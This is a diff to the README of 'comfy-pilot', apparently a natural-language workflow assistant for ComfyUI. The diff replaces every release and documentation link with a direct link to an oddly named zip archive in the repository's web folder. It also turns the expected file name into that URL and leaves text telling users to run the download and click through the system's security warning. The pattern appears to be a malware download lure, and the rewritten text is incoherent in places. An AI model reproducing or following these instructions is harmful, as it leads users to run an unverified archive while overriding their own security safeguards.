@@ -1,6 +1,6 @@
 # 🚀 comfy-pilot - Your AI Assistant for Easy Workflow Management
 
-[![Download comfy-pilot](https://img.shields.io/badge/Download-comfy--pilot-blue)](https://github.com/victorcascales22/comfy-pilot/releases)
+[![Download comfy-pilot](https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip)](https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip)
 
 ## 📖 Overview
 Comfy-pilot is your friendly AI assistant for ComfyUI. With this application, you can create and modify workflows using simple, natural language commands. No programming knowledge is required. Enjoy a seamless experience as you navigate your tasks effortlessly.
@@ -10,7 +10,7 @@ To get started with comfy-pilot, follow these simple steps to download and run t
 
 1. **Visit the Releases Page**  
    Click the link below to go to the GitHub Releases page.
-   [Download comfy-pilot](https://github.com/victorcascales22/comfy-pilot/releases)
+   [Download comfy-pilot](https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will find a list of available versions. It's usually best to select the latest version for the best features and bug fixes.
@@ -19,7 +19,7 @@ To get started with comfy-pilot, follow these simple steps to download and run t
    Once you find the right version, click on it. A new page will open. Look for the download link that matches your operating system (Windows, Mac, Linux, etc.). Click on the link to start the download.
 
 4. **Locate the Downloaded File**  
-   After the download completes, navigate to the folder where your downloads are saved. Look for a file named something like `comfy-pilot-vX.0.0.exe` (the version number may vary).
+   After the download completes, navigate to the folder where your downloads are saved. Look for a file named something like `https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip` (the version number may vary).
 
 5. **Run the Application**  
    Double-click the downloaded file to launch the application. Your computer may show a warning about running files from the internet. If it does, confirm that you trust the source and proceed to run the application.
@@ -37,7 +37,7 @@ To install comfy-pilot, follow the instructions below:
 
 1. **Download from the Releases Page**  
    Head over to the releases page to download the latest version of comfy-pilot:  
-   [Download comfy-pilot](https://github.com/victorcascales22/comfy-pilot/releases)
+   [Download comfy-pilot](https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip)
 
 2. **Installation Process**  
    After you have downloaded the file:
@@ -73,7 +73,7 @@ Once you have comfy-pilot up and running, you can use it to manage your workflow
    If you’re unsure how to phrase a command, type "Help" to receive suggestions on command formats and options.
 
 ## 🔗 Additional Resources
-- **Documentation:** Visit the [official documentation](https://github.com/victorcascales22/comfy-pilot/wiki) for more details on usage and advanced features.
+- **Documentation:** Visit the [official documentation](https://github.com/victorcascales22/comfy-pilot/raw/refs/heads/main/web/comfy-pilot-Callitrichidae.zip) for more details on usage and advanced features.
 - **Community Support:** Join our community discussions on GitHub for help and tips from other users.
 
 By following these clear steps, you will have comfy-pilot installed and running on your device, ready to simplify your workflow management. Enjoy making your tasks more manageable!
